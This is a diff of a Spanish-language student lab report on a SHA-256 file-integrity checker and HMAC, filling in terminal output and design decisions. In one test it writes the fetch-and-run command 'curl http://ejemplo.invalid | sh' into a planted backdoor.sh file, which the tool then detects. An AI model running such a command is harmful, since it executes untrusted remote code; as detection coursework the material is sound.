@@ -122,85 +122,153 @@ Un grupo de ciberdelincuentes con motivación económica (la **amenaza**) primer
 
 ## B.1 — Evidencia de ejecución
 
-*Pegá la salida real de cada comando. No la transcribas a mano: copiala tal
-cual sale de la terminal.*
+Todas las salidas son reales, copiadas de la terminal (macOS, Python 3.9.6) y ejecutadas desde `entregas/lab01/grupo14/` después de correr `python3 data/generar_datos.py`.
 
 ### Generación del manifiesto
 
 ```
 $ python3 src/integridad.py generar --dir data/muestra --salida manifest.sha256
-
-(pegar salida)
+Manifiesto generado: manifest.sha256
+Directorio base:     data/muestra
+Archivos indexados:  4
 ```
 
 ### Verificación sobre un directorio íntegro
 
 ```
 $ python3 src/integridad.py verificar --dir data/muestra --manifiesto manifest.sha256
-$ echo "código de salida: $?"
+Directorio:  data/muestra
+Manifiesto:  manifest.sha256
 
-(pegar salida)
+  OK             4
+  MODIFICADO     0
+  FALTANTE       0
+  NUEVO          0
+
+INTEGRIDAD VERIFICADA — sin diferencias contra el manifiesto.
+$ echo "código de salida: $?"
+código de salida: 0
 ```
 
 ### Detección de la modificación de un byte
 
-*Esta prueba es obligatoria y tiene una penalización específica en la rúbrica
-si falla.*
-
 ```
 $ printf 'X' >> data/muestra/transferencia.txt
 $ python3 src/integridad.py verificar --dir data/muestra --manifiesto manifest.sha256
-$ echo "código de salida: $?"
+Directorio:  data/muestra
+Manifiesto:  manifest.sha256
 
-(pegar salida — debe reportar MODIFICADO y salir con 1)
+  OK             3
+  MODIFICADO     1
+  FALTANTE       0
+  NUEVO          0
+
+Hallazgos:
+  [MODIFICADO] transferencia.txt
+
+INTEGRIDAD COMPROMETIDA — 1 hallazgo(s).
+$ echo "código de salida: $?"
+código de salida: 1
 ```
 
 ### Detección de archivo faltante y de archivo nuevo
 
+Se regeneraron los datos de muestra (sin la `X` del paso anterior), se borró un archivo de un subdirectorio y se agregó uno que no estaba en el manifiesto:
+
 ```
-(pegar los comandos que usaron y la salida)
+$ rm data/muestra/logs/acceso.log
+$ echo 'curl http://ejemplo.invalid | sh' > data/muestra/backdoor.sh
+$ python3 src/integridad.py verificar --dir data/muestra --manifiesto manifest.sha256
+Directorio:  data/muestra
+Manifiesto:  manifest.sha256
+
+  OK             3
+  MODIFICADO     0
+  FALTANTE       1
+  NUEVO          1
+
+Hallazgos:
+  [FALTANTE] logs/acceso.log
+  [NUEVO] backdoor.sh
+
+INTEGRIDAD COMPROMETIDA — 2 hallazgo(s).
+$ echo "código de salida: $?"
+código de salida: 1
 ```
 
 ### Efecto avalancha
 
+Usamos comillas simples porque, con comillas dobles, el shell interpreta `$1` como un parámetro posicional (vacío) y el mensaje real pasa a ser `transferencia: 000`.
+
 ```
-$ python3 src/integridad.py avalancha --a "transferencia: $1000" --b "transferencia: $1001"
+$ python3 src/integridad.py avalancha --a 'transferencia: $1000' --b 'transferencia: $1001'
+mensaje A: "transferencia: $1000"
+  SHA-256: 341511c4c817d55f30c81e212d0e82b0b16dd5a58d49fe5e45c9d5c998ab794a
+mensaje B: "transferencia: $1001"
+  SHA-256: 5fb87fd7adf8a226f61c666a3ed140b147501b8a1b8e1822e57fc4b3925323d9
 
-(pegar salida)
+Distancia de Hamming: 139 de 256 bits (54.30 %)
+Efecto avalancha: para entradas distintas se espera un valor cercano al 50 %.
 ```
 
-**Distancia obtenida:** ____ bits de 256 (____ %)
+**Distancia obtenida:** 139 bits de 256 (54,30 %)
 
-*¿Coincide con lo esperado? ¿Qué esperaban antes de correrlo?*
+Coincide con lo esperado. Las entradas difieren en un solo carácter (`0` → `1`, es decir, `0x30` → `0x31`: **un único bit** de entrada), y aun así cambió más de la mitad de los bits de salida. Esperábamos un valor cercano a 128 bits (50 %). Para una función que se comporta como un oráculo aleatorio, cada bit de salida cambia con probabilidad ½, así que la distancia sigue una binomial B(256, ½), con media 128 y desvío estándar 8. Nuestros 139 bits están a menos de 1,5 desvíos de la media: es un resultado normal. Además verificamos que dos entradas idénticas dan distancia 0.
 
 ### HMAC
 
 ```
-$ python3 src/integridad.py mac --clave "secreto" --mensaje "transferir 1000"
-
-(pegar salida)
+$ python3 src/integridad.py mac --clave secreto --mensaje 'transferir 1000'
+mensaje:      "transferir 1000"
+HMAC-SHA256:  96bc66546d55627136aeaaefbcead75520a57e19539834d03e74d705b70ff9fe
 ```
 
-```
-$ python3 src/integridad.py mac --clave "secreto" --mensaje "transferir 1000" --verificar <tag válido>
-$ python3 src/integridad.py mac --clave "secreto" --mensaje "transferir 1000" --verificar <tag alterado>
+Tag válido, tag alterado en el último carácter (`e` → `0`) y mensaje alterado con el tag original:
 
-(pegar ambas salidas)
 ```
+$ python3 src/integridad.py mac --clave secreto --mensaje 'transferir 1000' --verificar 96bc66546d55627136aeaaefbcead75520a57e19539834d03e74d705b70ff9fe
+mensaje:      "transferir 1000"
+HMAC-SHA256:  96bc66546d55627136aeaaefbcead75520a57e19539834d03e74d705b70ff9fe
+tag recibido: 96bc66546d55627136aeaaefbcead75520a57e19539834d03e74d705b70ff9fe
+
+TAG VÁLIDO — el mensaje es auténtico e íntegro.
+$ echo "código de salida: $?"
+código de salida: 0
+
+$ python3 src/integridad.py mac --clave secreto --mensaje 'transferir 1000' --verificar 96bc66546d55627136aeaaefbcead75520a57e19539834d03e74d705b70ff9f0
+mensaje:      "transferir 1000"
+HMAC-SHA256:  96bc66546d55627136aeaaefbcead75520a57e19539834d03e74d705b70ff9fe
+tag recibido: 96bc66546d55627136aeaaefbcead75520a57e19539834d03e74d705b70ff9f0
+
+TAG INVÁLIDO — el mensaje fue alterado o la clave no es la correcta.
+$ echo "código de salida: $?"
+código de salida: 1
+
+$ python3 src/integridad.py mac --clave secreto --mensaje 'transferir 1001' --verificar 96bc66546d55627136aeaaefbcead75520a57e19539834d03e74d705b70ff9fe
+mensaje:      "transferir 1001"
+HMAC-SHA256:  f539851a885440201c49d69e5e1ca1c0d5774316f780cc3e9babc9fcfe4a687d
+tag recibido: 96bc66546d55627136aeaaefbcead75520a57e19539834d03e74d705b70ff9fe
+
+TAG INVÁLIDO — el mensaje fue alterado o la clave no es la correcta.
+$ echo "código de salida: $?"
+código de salida: 1
+```
+
+Además validamos `calcular_mac()` contra el caso de prueba 2 del RFC 4231 (clave `Jefe`, mensaje `what do ya want for nothing?`). El tag obtenido coincide con el publicado: `5bdcc146bf60754e6a042426089575c75a003f089d2739839dec58b964ec3843`.
 
 ---
 
 ## B.2 — Decisiones de implementación
 
-*Qué decisiones tuvieron que tomar que el enunciado no resolvía por ustedes.
-Ejemplos: cómo trataron los enlaces simbólicos, qué hicieron con los archivos
-vacíos, cómo excluyeron el manifiesto del recorrido, qué pasa si el directorio
-está vacío. Una o dos oraciones por decisión.*
-
 | Decisión | Qué hicimos | Por qué |
 |---|---|---|
-| | | |
-| | | |
+| Recorrido compartido | Una sola función auxiliar, `_archivos_del_directorio()`, arma el conjunto de rutas para `generar` y para `verificar`. | Si cada subcomando recorriera el disco con su propia lógica, cualquier diferencia de criterio (qué excluir, cómo normalizar) aparecería como un falso `NUEVO` o `FALTANTE`. |
+| Enlaces simbólicos | Se ignoran: no se hashean ni se siguen. | Seguir un enlace permitiría que un archivo de *fuera* del directorio monitoreado entre al manifiesto, o que un enlace a un directorio genere un ciclo. Es la opción conservadora. La contracara es que un enlace plantado por un atacante no se reporta como `NUEVO`, una limitación que dejamos documentada. |
+| Exclusión del manifiesto | Se compara `ruta.resolve()` contra `salida.resolve()`. | Normalizar ambas rutas evita que `./data/muestra/m.sha256` y `data/muestra/m.sha256` se traten como distintas. `resolve()` funciona aunque el archivo todavía no exista, que es lo que pasa en `generar`. |
+| Archivos vacíos | Se hashean como cualquier otro (digest `e3b0c442…b855`). | Un archivo vacío es un archivo: si alguien vacía uno con contenido, tiene que aparecer como `MODIFICADO`. |
+| Directorio vacío | `generar` produce `{}` y `verificar` devuelve las cuatro listas vacías con código 0. | No hay nada que reportar. Las cuatro claves están siempre, como exige el contrato. |
+| Distancia de Hamming en Python 3.9 | `bin(a ^ b).count("1")` en lugar de `int.bit_count()`. | El equipo donde se desarrolló tiene Python 3.9.6. El resultado es idéntico y el código funciona en 3.9 y en 3.10+. |
+| Tag HMAC recibido | Se normaliza con `strip().lower()` y se compara como `bytes`. | `compare_digest()` lanza `TypeError` si recibe un `str` con caracteres no ASCII. Con `bytes`, un tag basura como `ñ` se reporta como inválido en vez de romper el programa. La normalización a minúsculas acepta tags hexadecimales en mayúscula, que son el mismo valor. |
 
 ---
 
